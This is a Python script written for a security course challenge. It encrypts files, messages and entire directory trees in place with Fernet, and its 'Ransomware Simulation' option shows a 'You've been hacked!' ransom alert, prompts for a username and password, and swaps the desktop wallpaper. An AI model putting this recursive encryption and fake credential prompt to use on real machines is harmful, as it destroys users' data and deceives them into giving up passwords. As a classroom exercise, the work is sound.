#!/bin/python3

# Script:                        401 Ops Class 08 Challenge
# Author:                        Marco Vazquez
# Purpose:                       Encryption of directory, file or string
# Date of Latest Revision:       4/12/2022


# Import libraries
from cryptography.fernet import Fernet
import os, math, time, datetime, getpass, os.path
import ctypes
import pyautogui
import urllib.request

# Declare variables

user_name = os.path.expanduser("~")


# Function declarations

# Generates a key and saves it into a file 
def write_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)
        return key

# Loads the generated key from current file named key.key
def load_key():
    try:
        return open("key.key", "rb").read()
    except: 
        return None

# Function to write key if it's not already there 
def key_not_found():
    key = load_key()
    if key == None:
        key = write_key()
    return Fernet(key)

# Encrypts the message using the generated key 
def encrypt_message():
    user_message = input("What would you like to encrypt? ")
    e_message = user_message.encode()
    # Initialize the Fernet class
    f = key_not_found()
    # Encrypt the message 
    encrypted = f.encrypt(e_message)
    print("Your encrypted message: " +str(encrypted.decode('utf-8')))

# Decrypts the message using the generated key 
def decrypt_message():
    user_input = input("What message would you like to decrypt? ")
    d_message = str.encode(user_input)
    f = key_not_found()
    # Decrypt the message 
    decrypted = f.decrypt(d_message)
    # remove the 'b' and extra ""
    print("Your decrypted messag is: " +str(decrypted.decode('utf-8')))

# Encrypts a file 
def encrypt_file():
    f = key_not_found()
    filename = input("Please enter the full filepath for the file you wish to encrypt? ")
    with open(filename, "rb") as file:
        #read file data
        file_data = file.read()
    # encrypt data
    encrypted_file = f.encrypt(file_data)
    # write the encrypted file
    with open(filename, "wb") as file:
        file.write(encrypted_file)

# Decrypts a file
def decrypt_file():
    f = key_not_found()
    filename = input("Please enter the full filepath for the file you wish to decrypt? ")
    with open(filename, "rb") as file:
        # read the encrypted data
        encrypted_doc = file.read()
    #decrypt data
    decrypted_info = f.decrypt(encrypted_doc)
    # write the original file
    with open (filename, "wb") as file:
        file.write(decrypted_info)

# Recursive encryption
def recursive_encryption(filename):
    f = key_not_found()
    with open(filename, "rb") as file:
        file_data = file.read()
    encrypted_file = f.encrypt(file_data)
    with open(filename, "wb") as file:
        file.write(encrypted_file)

# Recursive decryption
def recursive_decryption(filename):
    f = key_not_found()
    with open(filename, "rb") as file:
        encrypted_doc = file.read()
    decrypted_info = f.decrypt(encrypted_doc)
    with open (filename, "wb") as file:
        file.write(decrypted_info)

#Traverse & encrypt directory tree
def directory_encryption():
    path = input("Enter the absolute path to the directory you want to encrypt: ")
    for dirpath, dirnames, filenames in os.walk(path):
        print('Directory: {:s}'.format(dirpath))
        for file in filenames:
            filename = os.path.join(dirpath,file)
            recursive_encryption(filename)

#Traverse & decrypt directory tree
def directory_decryption():
    path = input("Enter the absolute filepath to the directory you would like to decrypt: ")
    for dirpath, dirnames, filenames in os.walk(path):
        print('Directory: {:s}'.format(dirpath))
        for file in filenames:
            filename = os.path.join(dirpath,file)
            recursive_decryption(filename)


def prompt():
    pyautogui.alert('All of your files are encrypted, check your desktop wallpaper for directions on how to get your files back', "You've been hacked!")  # always returns "OK"
    pyautogui.confirm('Asks OK or Cancel')  # returns "OK" or "Cancel"
    pyautogui.prompt('Enter your username')  # returns string or None
    pyautogui.password('Enter password')  # returns string or None

# Changes the wallpaper in UBUNTU
def wallpaper_change():
    os.system("gsettings set org.gnome.desktop.background picture-uri https://wallpaperaccess.com/full/4534773.jpg")

# Restore the background wallpaper
def wallpaper_restore():
    os.system("gsettings set org.gnome.desktop.background picture-uri file:///usr/share/backgrounds/warty-final-ubuntu.png")

# Main Function
def main():
    while True:
        slct ='0'
        while slct =='0':
            print("Choose 1 of 8 choices")
            time.sleep(1)
            print("1. Encrypt a file")
            print("2. Decrypt a file")
            print("3. Encrypt a message")
            print("4. Decrypt a message")
            print("5. Recursively Encrypt a Directory")
            print("6. Recursively Decrypt a Directory")
            print("7. Ransomware Simulation")
            print("8. Exit Menu")
            time.sleep(1)

  
    ## Displays menu
            slct = input("Enter your choice [1-8]: ")
     
            if slct == "1":
                print("Alright, let's encrypt a file!")
                time.sleep(1)
                encrypt_file()
                print("Encrypted! What next?")
                time.sleep(1)
        
            elif slct == "2":
                print("Alright, let's decrypt a file!")
                decrypt_file()
                print("Decrypted! What next?")
                time.sleep(1)

            elif slct == "3":
                print("Alright, let's encrypt a message!")
                time.sleep(1)
                encrypt_message()
                print("What would you like to do next?")

            elif slct == "4":
                print("Alright, let's decrypt a message!")
                time.sleep(1)
                decrypt_message()
                print("What would you like to do next?")

            elif slct == "5":
                print("Alright, lettuce recursively encrypt directory!")
                directory_encryption()
                print("What would you like to do next?")

            elif slct == "6":
                print("Alright, lettuce recursively decrypt directory!")
                directory_decryption()
                print("What would you like to do next?")

            elif slct == "7":
                print("Check this out...")
                prompt()
                wallpaper_change()
                print ("You've been hacked!")

            elif slct == "8":
                time.sleep(1)
                wallpaper_restore()
                print("See ya!")
                exit()


            else:
        # Any integer inputs other than values 1-8 we print an error message
                input("Wrong option selection. Enter any key to try again..")


# Main

print("Welcome to the Encryptor!!!")
time.sleep(1)
main()

# End








